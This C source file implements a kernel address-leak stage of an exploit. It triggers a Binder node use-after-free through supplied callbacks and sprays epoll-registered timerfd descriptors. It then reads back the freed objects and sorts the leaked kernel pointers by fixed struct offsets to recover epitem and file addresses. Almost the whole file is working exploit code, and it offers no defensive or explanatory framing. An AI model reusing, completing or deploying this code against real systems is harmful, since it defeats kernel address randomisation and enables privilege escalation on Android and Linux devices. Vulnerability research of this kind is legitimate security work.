#define _GNU_SOURCE
#include <errno.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/timerfd.h>
#include <unistd.h>

typedef int (*binder_node_epitem_uaf_fn)(void *opaque, uint64_t base_id,
                                         uint32_t node_count, bool use_async);
typedef int (*binder_node_epitem_flush_fn)(void *opaque, uint32_t node_count);
typedef int (*binder_node_epitem_read_fn)(void *opaque, uint64_t *ptr_out,
                                          uint64_t *cookie_out);
typedef int (*binder_node_epitem_ack_fn)(void *opaque);

typedef struct {
    void *binder_opaque;
    binder_node_epitem_uaf_fn trigger_uaf_nodes;
    binder_node_epitem_flush_fn flush_uaf_reads;
    binder_node_epitem_read_fn read_binder_object;
    binder_node_epitem_ack_fn ack_binder_object;
    int epoll_fd;
    int *fds;
    size_t file_pair_count;
    uint64_t epitem_list_head_offset;
    uint64_t file_list_head_offset;
    uint64_t epitem_addr;
    uint64_t file_addr;
} binder_node_epitem_leak_ctx_t;

static bool binder_node_epitem_looks_like_kernel_pointer(uint64_t value) {
    return value > 0xffffff8000000000ULL;
}

int init_binder_node_epitem_leak(binder_node_epitem_leak_ctx_t *ctx,
                                 void *binder_opaque,
                                 binder_node_epitem_uaf_fn trigger_uaf_nodes,
                                 binder_node_epitem_flush_fn flush_uaf_reads,
                                 binder_node_epitem_read_fn read_binder_object,
                                 binder_node_epitem_ack_fn ack_binder_object,
                                 size_t file_pair_count) {
    if (!ctx || !trigger_uaf_nodes || !flush_uaf_reads || !read_binder_object ||
        !ack_binder_object || !file_pair_count) {
        return -EINVAL;
    }

    memset(ctx, 0, sizeof(*ctx));
    ctx->binder_opaque = binder_opaque;
    ctx->trigger_uaf_nodes = trigger_uaf_nodes;
    ctx->flush_uaf_reads = flush_uaf_reads;
    ctx->read_binder_object = read_binder_object;
    ctx->ack_binder_object = ack_binder_object;
    ctx->file_pair_count = file_pair_count;
    ctx->epitem_list_head_offset = 88;
    ctx->file_list_head_offset = 0xe0;
    ctx->epoll_fd = epoll_create1(0);
    ctx->fds = calloc(file_pair_count * 2, sizeof(*ctx->fds));
    if (ctx->epoll_fd < 0 || !ctx->fds) {
        return -ENOMEM;
    }

    return 0;
}

int execute_binder_node_epitem_prepare_files(binder_node_epitem_leak_ctx_t *ctx) {
    struct epoll_event event = {
        .events = EPOLLIN,
        .data = {0},
    };
    size_t i;

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->file_pair_count; i++) {
        int fd = timerfd_create(CLOCK_MONOTONIC, 0);
        int dup_fd;

        if (fd < 0) {
            return -errno;
        }
        dup_fd = dup(fd);
        if (dup_fd < 0) {
            close(fd);
            return -errno;
        }

        ctx->fds[i * 2] = fd;
        ctx->fds[i * 2 + 1] = dup_fd;

        if (epoll_ctl(ctx->epoll_fd, EPOLL_CTL_ADD, fd, &event) < 0 ||
            epoll_ctl(ctx->epoll_fd, EPOLL_CTL_ADD, dup_fd, &event) < 0) {
            return -errno;
        }
    }

    return 0;
}

int execute_binder_node_epitem_leak(binder_node_epitem_leak_ctx_t *ctx,
                                    uint64_t base_id, uint32_t node_count) {
    uint32_t i;

    if (!ctx) {
        return -EINVAL;
    }

    if (ctx->trigger_uaf_nodes(ctx->binder_opaque, base_id, node_count, true) < 0) {
        return -EIO;
    }
    if (ctx->flush_uaf_reads(ctx->binder_opaque, node_count) < 0) {
        return -EIO;
    }

    for (i = 0; i < node_count; i++) {
        uint64_t leak1 = 0;
        uint64_t leak2 = 0;
        bool leak1_is_epitem;
        bool leak2_is_epitem;

        if (ctx->read_binder_object(ctx->binder_opaque, &leak1, &leak2) < 0) {
            return -EIO;
        }
        if (ctx->ack_binder_object(ctx->binder_opaque) < 0) {
            return -EIO;
        }

        if (!binder_node_epitem_looks_like_kernel_pointer(leak1) ||
            !binder_node_epitem_looks_like_kernel_pointer(leak2)) {
            continue;
        }

        leak1_is_epitem = (leak1 % 128) == ctx->epitem_list_head_offset;
        leak2_is_epitem = (leak2 % 128) == ctx->epitem_list_head_offset;
        if (leak1_is_epitem == leak2_is_epitem) {
            continue;
        }

        if (leak1_is_epitem) {
            ctx->epitem_addr = leak1 - ctx->epitem_list_head_offset;
            ctx->file_addr = leak2 - ctx->file_list_head_offset;
        } else {
            ctx->epitem_addr = leak2 - ctx->epitem_list_head_offset;
            ctx->file_addr = leak1 - ctx->file_list_head_offset;
        }

        return 0;
    }

    return -ENOENT;
}

void cleanup_binder_node_epitem_leak(binder_node_epitem_leak_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return;
    }

    if (ctx->fds) {
        for (i = 0; i < ctx->file_pair_count * 2; i++) {
            if (ctx->fds[i] > 0) {
                close(ctx->fds[i]);
            }
        }
    }
    if (ctx->epoll_fd > 0) {
        close(ctx->epoll_fd);
    }

    free(ctx->fds);
    memset(ctx, 0, sizeof(*ctx));
}
